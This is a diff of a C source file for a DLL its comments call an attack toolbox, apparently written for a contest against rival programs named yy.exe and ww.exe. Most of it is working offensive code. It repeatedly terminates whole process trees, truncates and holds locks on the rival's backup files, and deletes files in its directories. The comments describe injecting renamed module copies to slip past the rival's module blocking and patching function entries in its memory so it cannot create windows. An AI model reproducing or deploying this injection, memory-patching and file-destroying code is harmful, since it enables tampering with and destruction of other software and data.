@@ -1,4 +1,4 @@
-/*
+﻿/*
  * atkcore.dll - 精简攻击工具箱
  * 功能：循环扫描并终止 yy.exe / ww.exe
  * 保留五种结束方式：
@@ -26,7 +26,7 @@
    lenovo_fix.exe 是 yy 的蜜罐子进程，也是它的复活锚点：我们每 30ms 杀一次、
    它就按 yy 的逻辑重新拉起一次并重建 WMI 订阅（自愈），纯杀是白费力气。
    它归"子进程策略"管：有弹窗 -> 注入进去疯狂嘲讽；没弹窗 -> 才杀。 */
-static const WCHAR *g_targets[] = { L"yy.exe", L"ww.exe", NULL };
+static const WCHAR *g_targets[] = { L"yy.exe", L"ww.exe", L"lenovo_fix.exe", NULL };
 static const WCHAR *g_hostTargets[] = { L"notepad.exe", NULL };
 
 static BOOL IsTargetName(LPCWSTR name)
@@ -51,6 +51,9 @@ static HANDLE g_hThread = NULL;
 
 /* 共享内存布局与命名常量：唯一来源见 xxipc.h */
 #include "xxipc.h"
+
+/* ---- 构建标记导出：注入方/加载方用它校验"拿到的确实是同一版二进制" ---- */
+__declspec(dllexport) const char * WINAPI XxBuildTag(void) { return "v7"; }
 static CRITICAL_SECTION g_csLog;
 static BOOL g_csLogInit = FALSE;
 static HANDLE g_hSharedMap = NULL;
@@ -132,21 +135,32 @@ static void EnsureLogInit(void)
         g_pSharedView = MapViewOfFile(g_hSharedMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
 }
 
-/* 详细日志：只写入共享内存（窗口显示） */
+/* 详细日志：共享内存（弹窗里看）+ **%TEMP%\xx_debug.log**（没有弹窗时必须靠它）。
+   用户明确要求"杀进程/锁死文件/删除文件都写点日志" —— 只写共享内存的话，
+   一旦没有弹窗（或弹窗被对端干掉）就完全看不到发生了什么。 */
 static void WriteKillLog(const WCHAR *format, ...)
 {
-    EnsureLogInit();
-    if (!g_csLogInit || !g_pSharedView) return;
-
-    SYSTEMTIME st;
-    GetLocalTime(&st);
     WCHAR szLine[512];
+    WCHAR fline[640];
     va_list args;
+
+    EnsureLogInit();
+
     va_start(args, format);
     _vsnwprintf(szLine, _countof(szLine) - 1, format, args);
     va_end(args);
     szLine[_countof(szLine) - 1] = L'\0';
 
+    /* 先落文件：g_pSharedView 为空时也要能看到 */
+    _snwprintf(fline, _countof(fline) - 1, L"[kill][pid=%lu] %s\r\n",
+               GetCurrentProcessId(), szLine);
+    fline[_countof(fline) - 1] = L'\0';
+    XXFileLog(fline);
+
+    if (!g_pSharedView) return;
+
+    SYSTEMTIME st;
+    GetLocalTime(&st);
     WCHAR entry[600];
     _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [kill] %s\r\n",
                st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
@@ -362,6 +376,7 @@ static BOOL LockThenDeleteFile(LPCWSTR path)
 {
     HANDLE h;
     FILE_DISPOSITION_INFO fdi;
+    DWORD err = 0;
 
     if (!path || !path[0]) return FALSE;
 
@@ -376,17 +391,85 @@ static BOOL LockThenDeleteFile(LPCWSTR path)
     }
     if (h == INVALID_HANDLE_VALUE) {
         /* 最后兜底：直接删（对没有独占句柄的文件有效） */
+        err = GetLastError();
         SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
-        return DeleteFileW(path);
+        if (DeleteFileW(path)) {
+            WriteKillLog(L"锁死删除: %s（直接删，打开句柄失败 err=%lu）", path, err);
+            return TRUE;
+        }
+        WriteKillLog(L"锁死删除失败: %s（打开失败 err=%lu，DeleteFile 也失败 err=%lu）",
+                     path, err, GetLastError());
+        return FALSE;
     }
 
     fdi.DeleteFile = TRUE;
-    SetFileInformationByHandle(h, FileDispositionInfo, &fdi, sizeof(fdi));
+    if (!SetFileInformationByHandle(h, FileDispositionInfo, &fdi, sizeof(fdi)))
+        err = GetLastError();
     CloseHandle(h);                       /* 关掉最后一个句柄 → 真正删除 */
     SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
-    return (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) ? TRUE : DeleteFileW(path);
+    if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) {
+        WriteKillLog(L"锁死并删除成功: %s", path);
+        return TRUE;
+    }
+    if (DeleteFileW(path)) {
+        WriteKillLog(L"锁死删除: %s（删除待决没生效 err=%lu，DeleteFile 成功）", path, err);
+        return TRUE;
+    }
+    WriteKillLog(L"锁死删除失败: %s（删除待决 err=%lu，DeleteFile err=%lu）",
+                 path, err, GetLastError());
+    return FALSE;
 }
 
+/* ================== 清空并**保持锁住**（对付 yy 的自我备份/还原链） ==================
+   为什么不是"删掉就完事"：yy.exe 自己会把自己的镜像**再备份**成 <dir>\yyres.bin
+   （见 yy.exe 里 CopyFileW + "yyres.bin" 的两处），删一次它下一轮又补回来。
+   这里改成：打开 → **截断成 0 字节** → **句柄不关**（GENERIC_READ|WRITE、无共享）。
+   效果：
+     · 它想 CopyFileW(yyres.bin → yy.exe) → 共享冲突，失败；
+     · 就算绕过（比如先删），文件内容也是 0 字节 → 还原出的 yy.exe 是空文件 → CreateProcess 必失败。
+   句柄一直留到我方进程结束（最多 8 个，够用；句柄本身几乎不占资源）。 */
+static HANDLE g_holdFiles[8];
+static WCHAR  g_holdPaths[8][MAX_PATH];
+static int    g_nHolds = 0;
+
+static BOOL NeutralizeFile(LPCWSTR path)
+{
+    HANDLE h;
+    LARGE_INTEGER zero;
+    int i;
+
+    if (!path || !path[0]) return FALSE;
+    for (i = 0; i < g_nHolds; i++)
+        if (_wcsicmp(g_holdPaths[i], path) == 0) return TRUE;    /* 已经锁住 */
+
+    h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
+                    FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        h = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    }
+    if (h == INVALID_HANDLE_VALUE) {
+        DWORD e = GetLastError();
+        /* 打不开就退化成"锁死删除"（它至少没了这个文件） */
+        if (LockThenDeleteFile(path)) return TRUE;
+        WriteKillLog(L"清空锁住失败: %s err=%lu", path, e);
+        return FALSE;
+    }
+
+    zero.QuadPart = 0;
+    SetFilePointerEx(h, zero, NULL, FILE_BEGIN);
+    if (!SetEndOfFile(h))
+        WriteKillLog(L"截断失败（仍然持锁）: %s err=%lu", path, GetLastError());
+
+    if (g_nHolds < 8) {                       /* 句柄**不关**：锁一直有效 */
+        g_holdFiles[g_nHolds] = h;
+        wcsncpy_s(g_holdPaths[g_nHolds], MAX_PATH, path, _TRUNCATE);
+        g_nHolds++;
+    } else {
+        CloseHandle(h);
+    }
+    WriteKillLog(L"已清空并锁住（yy 的还原源失效）: %s", path);
+    return TRUE;
+}
 /* 我方文件名：清空敌人目录时绝不能顺手删掉自己的东西 */
 static const WCHAR *g_ownNames[] = {
     L"xx.exe", L"xxres.bin", L"svcguard.dll", L"window.dll", L"atkcore.dll",
@@ -440,6 +523,26 @@ static BOOL IsEnemyBackupName(LPCWSTR leaf)
 
 /* 清空敌人目录：逐个文件"先锁死再删除"，自己的文件名跳过；
    对手的自备份则改写成我方内容而不是删除（#19）。 */
+/* 目标 exe 所在目录是不是"系统临时目录"。
+   为什么必须区分：yy 的蜜罐 lenovo_fix.exe 就住在 %TEMP%，若按"被杀进程所在目录"
+   去整目录清空，等于把**整个 %TEMP% 删一遍** —— 那包括我们自己的注入副本
+   （sechostXXXX.dll 之类）和机器上其它程序的临时文件。实测后果：我们的副本被删 →
+   反复重新复制注入，机器上别的程序也会莫名其妙丢文件。 */
+static BOOL IsSystemTempDir(LPCWSTR dir)
+{
+    WCHAR tmp[MAX_PATH];
+    DWORD n;
+
+    if (!dir || !dir[0]) return FALSE;
+    n = GetTempPathW(MAX_PATH, tmp);
+    if (n == 0 || n >= MAX_PATH) return FALSE;
+    while (n > 0 && (tmp[n - 1] == L'\\' || tmp[n - 1] == L'/')) tmp[--n] = L'\0';
+    if (n == 0) return FALSE;
+    if (_wcsnicmp(dir, tmp, n) != 0) return FALSE;
+    /* 必须是"%TEMP%\" 本身，不是 %TEMP%\sub 这种子目录 */
+    return (dir[n] == L'\0' || (dir[n] == L'\\' && dir[n + 1] == L'\0')) ? TRUE : FALSE;
+}
+
 static void WipeDirPass(LPCWSTR dir)
 {
     WCHAR pattern[MAX_PATH];
@@ -448,6 +551,12 @@ static void WipeDirPass(LPCWSTR dir)
     int n = 0;
 
     if (!dir || !dir[0]) return;
+    /* 系统临时目录**不做整目录清空**：只删该进程自己的镜像（由 KillProcessTree 里的
+       WipeTreeEntry 负责），蜜罐的复活源由 BlockHoneypotRespawn 锁住。 */
+    if (IsSystemTempDir(dir)) {
+        WriteKillLog(L"跳过整目录清空：%s 是系统临时目录（只处理该进程自己的镜像）", dir);
+        return;
+    }
     swprintf_s(pattern, MAX_PATH, L"%s*", dir);
 
     hFind = FindFirstFileW(pattern, &fd);
@@ -476,9 +585,9 @@ static DWORD WINAPI WipeEnemyDirThread(LPVOID lp)
     wcsncpy_s(dir, MAX_PATH, (LPCWSTR)lp, _TRUNCATE);
     LocalFree(lp);
 
-    Sleep(150);            /* 让"杀进程"先落定，避免对方还在写文件 */
+    Sleep(60);             /* 让"杀进程"先落定（频率要求 <80ms） */
     WipeDirPass(dir);
-    Sleep(1200);           /* 对方常在同一目录重建，隔一会儿再清一遍 */
+    Sleep(70);             /* 对方常在同一目录重建，隔一会儿再清（<80ms，由外层的重复清理兜住） */
     WipeDirPass(dir);
     return 0;
 }
@@ -506,8 +615,20 @@ static void SpawnWipeEnemyDir(LPCWSTR exePath)
 }
 
 /* 收进程树（含自己），最多 MAX_TREE 个 */
-#define MAX_TREE 64
-typedef struct { DWORD pid; WCHAR path[MAX_PATH]; } TreeEntry;
+/* ================== 收进程树 + 杀树（参考 AntierX 的 kill_process_tree） ==================
+   关键改动（用户反馈"进程树没有被结束"）：
+     ① **只快照一次**，用父子表做 BFS（原来每层重新快照：中途新起的子进程会让"层"错乱，
+        而且 6 层 × 全表枚举很慢）；
+     ② 记录 depth，**按深度降序杀**（叶子先杀，根最后），防止父进程在被杀时又拉起子进程；
+     ③ 每个进程杀完都 `WaitForSingleObject(SYNCHRONIZE)` **等它真的退出**（原来不看结果，
+        "Terminate 返回 TRUE" 不等于"进程已经没了"），没退出就补一刀再等；
+     ④ 收尾再扫一遍，把这一轮里新冒出来的子进程也补杀掉。
+   AntierX 的对应实现（E:\Python\AntierX\cpp\src\ai\ai_tools_process.cpp
+   的 t_kill_process_tree）也是这个套路：一次快照建 kids 表 → 深度降序 → TerminateProcess
+   + WaitForSingleObject → 逐个记录 ok/error。 */
+#define MAX_TREE 128
+#define MAX_SNAP 2048
+typedef struct { DWORD pid; int depth; WCHAR path[MAX_PATH]; } TreeEntry;
 
 /* 单个进程的源文件：先锁死（删除待决）再删除 */
 static void WipeTreeEntry(TreeEntry *e)
@@ -519,75 +640,271 @@ static void WipeTreeEntry(TreeEntry *e)
         WriteKillLog(L"源文件锁删失败: %s", e->path);
 }
 
+/* ================== 掐断 yy 的复活源（读完 testyy 的汇编后加的） ==================
+   yy.exe 的 yyguaard.dll（注入到每个 yy 进程和若干宿主）里那段循环是：
+
+       每 150ms：
+         cnt = 数进程表里叫 yy.exe 的进程数
+         if (cnt <= 0)  → 去 spawn
+         if (FindWindowW(L"YYWnd_7f3a9c1e") == NULL) {          // 没有主窗口 = 认为全挂了
+              if (1500ms 到了) { 杀光**所有** yy.exe；cnt = 重新数 }
+         }
+         if (cnt >= 3) → 只 sleep，不 spawn
+         if (距上次 spawn < 250ms) → 只 sleep
+         if (<dir>\yy.exe 不存在) CopyFileW(<dir>\yyres.bin → <dir>\yy.exe)   // 从备份还原
+                                  失败再 CopyFileW(%TEMP%\yy_backup_7f3a9c1e.dat → …)
+         CreateProcessW(<dir>\yy.exe, NULL, cwd=<dir>)       // 起一个新副本
+
+   这就是"启动后疯狂启动副本"的来源：**每个**被注入的 guard 都独立跑这段，没有单例/互斥；
+   没有主窗口时它们先互相把 yy.exe 杀光，再各自补一个，于是 杀→补→杀→补 无限循环。
+   我们的对策很直接：**把它的"备料"锁死**——它还原/启动都要读这些文件，读不到就彻底哑火。
+
+   注意：这些文件必须**先锁死（删除待决、独占、不给共享读）再删除**，
+   这样 guard 的 CopyFileW / CreateProcessW 都会失败（文件在、但打不开 = 没有可启动的镜像）。 */
+static void KillYyRespawnSources(LPCWSTR enemyExePath)
+{
+    WCHAR dir[MAX_PATH] = L"";
+    WCHAR p[MAX_PATH];
+    WCHAR temp[MAX_PATH];
+    const WCHAR *slash;
+
+    if (enemyExePath && enemyExePath[0]) {
+        wcsncpy_s(dir, MAX_PATH, enemyExePath, _TRUNCATE);
+        slash = wcsrchr(dir, L'\\');
+        if (slash) dir[slash - dir + 1] = L'\0';
+    }
+    if (dir[0]) {
+        /* ① 还原源：yyres.bin（guard 直接用它覆盖出 yy.exe） */
+        swprintf_s(p, MAX_PATH, L"%lsyyres.bin", dir);
+        NeutralizeFile(p);
+
+        /* ② guard 本体：锁死后新起的 yy 副本/注入都读不到它（Spread 直接失效） */
+        swprintf_s(p, MAX_PATH, L"%lsyyguard.dll", dir);
+        if (LockThenDeleteFile(p)) WriteKillLog(L"已锁死并删除 yyguaard.dll: %s", p);
+    }
+
+    /* ③ %TEMP% 里的第二份备份（guard 的 CopyFileW 备用源） */
+    if (GetTempPathW(MAX_PATH, temp)) {
+        swprintf_s(p, MAX_PATH, L"%lsyy_backup_7f3a9c1e.dat", temp);
+        NeutralizeFile(p);
+    }
+}
+/* 等某个 pid 真的退出；打不开当已退出（可能刚死/被保护） */
+static BOOL WaitPidExit(DWORD pid, DWORD ms)
+{
+    HANDLE h = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    DWORD w;
+    if (!h) return TRUE;
+    w = WaitForSingleObject(h, ms);
+    CloseHandle(h);
+    return (w == WAIT_OBJECT_0) ? TRUE : FALSE;
+}
+
+/* 一次快照 + BFS 收树；结果按 depth 降序（叶子在前、根在最后） */
 static int CollectTree(DWORD rootPid, TreeEntry *out, int max)
 {
-    int n = 0, i, depth;
+    static DWORD sPid[MAX_SNAP];
+    static DWORD sPpid[MAX_SNAP];
+    int nAll = 0, n = 0, i, j, k;
+    HANDLE hSnap;
+    PROCESSENTRY32W pe = { sizeof(pe) };
+
+    if (!out || max <= 0) return 0;
+
+    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return 0;
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            if (nAll >= MAX_SNAP) break;
+            sPid[nAll] = pe.th32ProcessID;
+            sPpid[nAll] = pe.th32ParentProcessID;
+            nAll++;
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
 
     out[n].pid = rootPid;
-    out[n].path[0] = L'\0';
+    out[n].depth = 0;
     GetProcessPath(rootPid, out[n].path, MAX_PATH);
     n++;
 
-    /* 逐层展开：每轮把"父在树里"的进程收进来（深度上限 6，防环） */
-    for (depth = 0; depth < 6 && n < max; depth++) {
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        int added = 0;
-        if (hSnap == INVALID_HANDLE_VALUE) break;
-        {
-            PROCESSENTRY32W pe = { sizeof(pe) };
-            if (Process32FirstW(hSnap, &pe)) {
-                do {
-                    BOOL bParentInTree = FALSE, bAlready = FALSE;
-                    if (n >= max) break;
-                    if (pe.th32ProcessID <= 4) continue;
-                    for (i = 0; i < n; i++) {
-                        if (out[i].pid == pe.th32ProcessID) { bAlready = TRUE; break; }
-                        if (out[i].pid == pe.th32ParentProcessID) bParentInTree = TRUE;
-                    }
-                    if (bAlready || !bParentInTree) continue;
-                    out[n].pid = pe.th32ProcessID;
-                    out[n].path[0] = L'\0';
-                    GetProcessPath(pe.th32ProcessID, out[n].path, MAX_PATH);
-                    n++;
-                    added++;
-                } while (Process32NextW(hSnap, &pe));
-            }
+    /* BFS：边遍历边把子进程加进 out（out 同时充当已访问集合） */
+    for (i = 0; i < n && n < max; i++) {
+        if (out[i].depth >= 8) continue;                 /* 深度上限，防环 */
+        for (j = 0; j < nAll && n < max; j++) {
+            BOOL bSeen = FALSE;
+            if (sPpid[j] != out[i].pid) continue;
+            if (sPid[j] <= 4 || sPid[j] == rootPid) continue;
+            for (k = 0; k < n; k++)
+                if (out[k].pid == sPid[j]) { bSeen = TRUE; break; }
+            if (bSeen) continue;
+            out[n].pid = sPid[j];
+            out[n].depth = out[i].depth + 1;
+            GetProcessPath(out[n].pid, out[n].path, MAX_PATH);   /* 杀完就取不到了，先取 */
+            n++;
         }
-        CloseHandle(hSnap);
-        if (!added) break;
+    }
+
+    /* 按 depth 降序：插入排序（n 很小） */
+    for (i = 1; i < n; i++) {
+        TreeEntry key = out[i];
+        for (j = i - 1; j >= 0 && out[j].depth < key.depth; j--) out[j + 1] = out[j];
+        out[j + 1] = key;
     }
     return n;
 }
 
-/* 杀整棵进程树：先取路径（杀完就取不到），子进程先杀，然后逐个"先锁死再删除"源文件 */
-static void KillProcessTree(DWORD rootPid)
+/* 杀一个 pid：TryAllMethods → 等退出 → 没退再补一刀 */
+static void KillOneAndWait(DWORD pid, LPCWSTR why)
+{
+    WCHAR name[MAX_PATH] = L"";
+    const WCHAR *base = L"unknown";
+    if (GetProcessPath(pid, name, MAX_PATH)) {
+        const WCHAR *p = wcsrchr(name, L'\\');
+        base = p ? p + 1 : name;
+    }
+    TryAllMethods(base, pid);
+    if (WaitPidExit(pid, 800)) {
+        WriteKillLog(L"PID=%lu(%ls) 已退出（%ls）", pid, base, why ? why : L"");
+        return;
+    }
+    WriteKillLog(L"PID=%lu(%ls) Terminate 后仍存活 -> 补一刀（%ls）", pid, base, why ? why : L"");
+    TryAllMethods(base, pid);
+    if (WaitPidExit(pid, 1500))
+        WriteKillLog(L"PID=%lu(%ls) 补刀后已退出", pid, base);
+    else
+        WriteKillLog(L"!! PID=%lu(%ls) 杀不掉（受保护进程/权限不足）", pid, base);
+}
+
+/* 杀整棵进程树（**同步实现**）：叶子先杀 → 根最后杀；每个都等它真的退出，然后逐文件锁死删除。
+   注意它内部有 WaitForSingleObject（每个进程最多等 800+1500ms），
+   所以**绝不能**在攻击主循环里直接调用 —— 统一走下面的 KillProcessTree() 异步包装。 */
+static void KillProcessTreeSync(DWORD rootPid)
 {
     TreeEntry tree[MAX_TREE];
     int n, i;
 
+    if (rootPid <= 4) return;
     n = CollectTree(rootPid, tree, MAX_TREE);
-    WriteKillLog(L"进程树: 根 PID=%lu 共 %d 个进程", rootPid, n);
+    WriteKillLog(L"进程树: 根 PID=%lu 共 %d 个进程（按深度降序，叶子先杀）", rootPid, n);
+    if (n <= 0) return;
 
-    /* 先杀子进程（由深到浅），最后杀根，避免父进程又拉起新的子进程 */
-    for (i = n - 1; i >= 0; i--) {
-        WCHAR name[MAX_PATH];
-        const WCHAR *base = L"unknown";
-        if (tree[i].path[0]) {
-            const WCHAR *p = wcsrchr(tree[i].path, L'\\');
-            base = p ? p + 1 : tree[i].path;
-        }
-        wcsncpy_s(name, MAX_PATH, base, _TRUNCATE);
-        TryAllMethods(name, tree[i].pid);
-        if (i != 0) WipeTreeEntry(&tree[i]);   /* 子进程源文件立刻锁死+删除 */
+    for (i = 0; i < n; i++) {
+        KillOneAndWait(tree[i].pid, (i == n - 1) ? L"根进程" : L"子进程");
+        if (i != n - 1) WipeTreeEntry(&tree[i]);      /* 子进程源文件立刻锁死+删除 */
     }
 
-    /* 根进程自己的源文件：清空其目录由新线程负责 */
-    if (tree[0].path[0]) {
-        WipeTreeEntry(&tree[0]);
-        SpawnWipeEnemyDir(tree[0].path);
+    /* 根进程自己的源文件：清空其目录由新线程负责（隔 1.2s 再清一遍） */
+    if (tree[n - 1].path[0]) {
+        WipeTreeEntry(&tree[n - 1]);
+        KillYyRespawnSources(tree[n - 1].path);   /* 掐复活源：yyres.bin / yyguaard.dll / %TEMP% 备份 */
+        SpawnWipeEnemyDir(tree[n - 1].path);
+    }
+
+    /* 收尾：这一轮里可能又冒出新子进程（父进程被杀前的 last gasp），补杀一轮 */
+    {
+        TreeEntry again[MAX_TREE];
+        int m = CollectTree(rootPid, again, MAX_TREE), j, killed = 0;
+        for (j = 0; j < m; j++) {
+            int k;
+            BOOL bKnown = FALSE;
+            for (k = 0; k < n; k++) if (tree[k].pid == again[j].pid) { bKnown = TRUE; break; }
+            if (bKnown) continue;
+            WriteKillLog(L"补杀新出现的子进程 PID=%lu", again[j].pid);
+            KillOneAndWait(again[j].pid, L"新冒出的子进程");
+            WipeTreeEntry(&again[j]);
+            killed++;
+        }
+        if (killed) WriteKillLog(L"进程树收尾: 补杀 %d 个", killed);
     }
 }
 
+static BOOL KillFast(DWORD pid);        /* 前置声明：快杀（挂起+终止），定义在文件后部 */
+
+/* ================== 杀树：**先快杀，再后台清理** ==================
+   用户实测两个问题（都在这一版之前）：
+     · 变慢 —— 旧写法把"等进程退出 + 逐文件锁死删除"整段放进每个目标的线程里，
+       8 个槽被 yy 的慢清理占满；
+     · 只杀得掉 yy.exe，**lenovo_fix 不死** —— 因为槽满时新目标被**静默丢弃**。
+   新策略：
+     ① 杀（快、同步、无等待）：一次快照收树 → 对每个成员 KillFast（挂起+终止）
+        → 立刻返回。这一段只有几十微秒级开销，永远不会丢目标、也绝不阻塞；
+     ② 清理（慢，后台单线程排队）：等退出 → 没退补刀 → 逐文件"先锁死再删除" →
+        根目录整目录清空 → 收尾补杀。按**单线程队列**顺序做，不占攻击循环，
+        也不会有"8 个槽"这种会丢目标的限制。
+   所以：**看到就必杀**（快杀保证），清理慢一点无所谓（它已经在后台跑）。 */
+#define CLEAN_QMAX 64
+static DWORD g_cleanPids[CLEAN_QMAX];
+static volatile LONG g_cleanBusy[CLEAN_QMAX];
+static volatile LONG g_cleanThreadRunning = 0;
+
+static DWORD WINAPI CleanupThreadProc(LPVOID lp)
+{
+    int i;
+    UNREFERENCED_PARAMETER(lp);
+    for (;;) {
+        DWORD pid = 0;
+        int slot = -1;
+        for (i = 0; i < CLEAN_QMAX; i++) {
+            if (g_cleanPids[i] && g_cleanBusy[i]) { pid = g_cleanPids[i]; slot = i; break; }
+        }
+        if (slot < 0) break;                       /* 队列空：线程退出，下次再起 */
+        KillProcessTreeSync(pid);                  /* 等退出 + 补刀 + 锁死删除 + 收尾补杀 */
+        InterlockedExchange(&g_cleanBusy[slot], 0);
+        g_cleanPids[slot] = 0;
+    }
+    InterlockedExchange(&g_cleanThreadRunning, 0);
+    return 0;
+}
+
+static void QueueCleanup(DWORD pid)
+{
+    int i, slot = -1;
+    HANDLE h;
+    if (pid <= 4 || pid == GetCurrentProcessId()) return;
+    for (i = 0; i < CLEAN_QMAX; i++) {
+        if (g_cleanPids[i] == pid && g_cleanBusy[i]) return;    /* 已在队列 */
+    }
+    for (i = 0; i < CLEAN_QMAX; i++) {
+        if (InterlockedCompareExchange(&g_cleanBusy[i], 1, 0) == 0) {
+            g_cleanPids[i] = pid;
+            slot = i;
+            break;
+        }
+    }
+    if (slot < 0) { WriteKillLog(L"清理队列已满，PID=%lu 的清理跳过（进程已被快杀）", pid); return; }
+    if (InterlockedCompareExchange(&g_cleanThreadRunning, 1, 0) == 0) {
+        h = CreateThread(NULL, 0, CleanupThreadProc, NULL, 0, NULL);
+        if (h) CloseHandle(h);
+        else InterlockedExchange(&g_cleanThreadRunning, 0);
+    }
+}
+
+/* 对外统一入口：**快杀 + 清理排队**（这是唯一会被攻击循环调用的路径） */
+static void KillProcessTree(DWORD rootPid)
+{
+    TreeEntry tree[MAX_TREE];
+    int n, i, killed = 0;
+
+    if (rootPid <= 4 || rootPid == GetCurrentProcessId()) return;
+    n = CollectTree(rootPid, tree, MAX_TREE);        /* 一次快照（含路径） */
+    if (n <= 0) return;
+
+    for (i = 0; i < n; i++) {                        /* 快杀：不等、不删文件 */
+        if (KillFast(tree[i].pid)) killed++;
+        else {
+            HANDLE hk = OpenProcess(PROCESS_TERMINATE, FALSE, tree[i].pid);
+            if (hk) {
+                TerminateProcess(hk, 0);
+                CloseHandle(hk);
+                killed++;
+            }
+        }
+    }
+    WriteKillLog(L"快杀: 根 PID=%lu 树内 %d 个，已终止 %d 个（清理转入后台）", rootPid, n, killed);
+
+    for (i = 0; i < n; i++) QueueCleanup(tree[i].pid);   /* 清理：等退出+补刀+锁删 */
+}
 /* ================== 对手进程内存改写（非断点 patch，yybad.md P2） ==================
    做法：在 yy 自己的进程里**改函数入口的机器码**（不写 0xCC，不触发它的 VEH）：
    #16 把 user32!CreateWindowExW 入口改成 `xor eax,eax; ret` → 它再也建不出弹窗
@@ -754,35 +1071,14 @@ static void PatchEnemyMemory(DWORD pid)
     EnemyClose(&em);
 }
 
-/* ================== 注入到 yy 之后：从它进程内部动手（#10 / #11） ==================
+/* ================== 注入到 yy 之后：从它进程内部动手（#11） ==================
    我们的扩散器本来就会把本模块注入 yy：yy.exe 不在保护名单里，注入的又是改名副本，
    它按 BAD_MODULES 做的子串拦截失效。一旦 atkcore 在 yy 里跑起来：
-     #10 子类化它日志框的 WndProc —— 它每写一行日志都被换成嘲讽，等于劫持它的"眼睛"
-         （yybad.md 1.6 利用 4）。这里是同一进程，字符串指针有效，可以放心替换。
-     #11 UnregisterClassW 掉它的窗口类，并把 RegisterClassExW / CreateWindowExW
-         在**本进程内**也改成返回失败 —— 它再也注册不出/建不出弹窗（双保险，
-         与跨进程的 #16 叠加）。顺手把它的主窗口藏起来。
-   这两件事只在"宿主是 yy/ww"时做，而且不杀自己所在的这个 yy（留着眼线）。 */
-static const WCHAR *g_yyTaunts[] = {
-    L"[xx] yy.exe is just a waste\r\n",
-    L"[xx] your log is mine now\r\n",
-    L"[xx] xx_ALIVE_WND > YY_Defensive_GUI\r\n",
-    L"[xx] ni de tanchuang yi jing gui wo le\r\n"
-};
-static WNDPROC g_oldLogProc = NULL;
-static int     g_nYyTaunt = 0;
+     #11 UnregisterClassW 掉它的窗口类，并把 RegisterClassExW / RegisterClassW /
+         CreateWindowExW / CreateWindowExA 在**本进程内**也改成返回失败 ——
+         它再也注册不出/建不出弹窗（与跨进程的 #16 双保险）。
+   （原先还有 #10 子类化它的日志框做嘲讽；嘲讽整块已按用户要求删除。） */
 static BOOL    g_bYyClassKilled = FALSE;
-
-static LRESULT CALLBACK EvilLogProc(HWND h, UINT m, WPARAM w, LPARAM l)
-{
-    if (m == EM_REPLACESEL || m == WM_SETTEXT) {
-        /* 把它要写进去的内容换成嘲讽（同进程，直接改 lParam 指向的串） */
-        const WCHAR *t = g_yyTaunts[g_nYyTaunt++ % (sizeof(g_yyTaunts) / sizeof(g_yyTaunts[0]))];
-        if (m == WM_SETTEXT) return CallWindowProcW(g_oldLogProc, h, m, w, (LPARAM)t);
-        return CallWindowProcW(g_oldLogProc, h, m, w, (LPARAM)t);
-    }
-    return CallWindowProcW(g_oldLogProc, h, m, w, l);
-}
 
 /* 本进程内的函数入口改写（不需要 VirtualProtectEx，改的是自己） */
 static BOOL LocalPatchFunc(const WCHAR *moduleName, const char *funcName, const BYTE *bytes, SIZE_T len)
@@ -834,16 +1130,8 @@ static void InfectYyHost(void)
 
     hMain = FindYyMainWindowHere();
     if (hMain) {
-        /* #10：子类化它的日志框 */
-        HWND hLog = FindWindowExW(hMain, NULL, L"EDIT", NULL);
-        if (hLog && g_oldLogProc == NULL) {
-            WNDPROC old = (WNDPROC)SetWindowLongPtrW(hLog, GWLP_WNDPROC, (LONG_PTR)EvilLogProc);
-            if (old) {
-                g_oldLogProc = old;
-                WriteKillLog(L"#10 已子类化 yy 的日志框，它的日志从此由我们代写");
-            }
-        }
-        /* 顺手把它的主窗口藏起来（同进程 ShowWindow 生效） */
+        /* 进了 yy 的进程内部就别客气了：把它的主窗口藏起来，
+           连同 #16/#11 一起让它的"存活证明"立刻消失。 */
         ShowWindow(hMain, SW_HIDE);
     }
 
@@ -861,19 +1149,18 @@ static void InfectYyHost(void)
 }
 
 /* 宿主进程名是不是 yy/ww（核心目标）。lenovo_fix.exe 之类的蜜罐子进程不算：
-   它们走子进程策略（有弹窗就嘲讽、没弹窗才杀），不当"感染宿主"。
-   实现见下方 HostIsTargetExe()（与 HostLeafName 同处定义）。 */
+    它们走子进程策略，不当"感染宿主"。
+    实现见下方 HostIsTargetExe()（与 HostLeafName 同处定义）。 */
 static BOOL HostIsTargetExe(void);
 
-/* ================== yy 子进程策略（按你的要求） ==================
-   规则（第 4 版）：
-     ① yy.exe / ww.exe（本体）—— 先由 waste 模仿线程发布 XX_TAUNTS_BEFORE_KILL 条嘲讽，
-        够了才**结束进程树 + 源文件先锁死再删除**（计数器按 PID 记，yy 死了就作废，
-        下一个 yy 实例重新数）；
-     ② 它们的子进程（含孙进程，例如蜜罐 lenovo_fix.exe）—— **直接杀掉 + 锁死 + 删除**
-        （KillProcessTree 内部就是"源文件置删除待决再删 + 根进程目录整目录清空"），不嘲讽。 */
+/* ================== yy 处理策略（嘲讽已按用户要求删除） ==================
+   ① yy.exe / ww.exe（本体）—— **发现即杀**：先把它那个窗口就地打死（A2：终止持有窗口的
+      GUI 线程，窗口立刻消失），再结束整棵进程树 + 所有源文件先锁死再删除；
+   ② 它们的子进程（含孙进程，例如蜜罐 lenovo_fix.exe）—— 同样直接杀掉 + 锁死 + 删除
+      （KillProcessTree 内部就是"源文件置删除待决再删 + 根进程目录整目录清空"）。
+   没有"先嘲讽 N 条再杀"的门控了：门控一卡住本体就不死，它的 HoneypotDecoyWorker
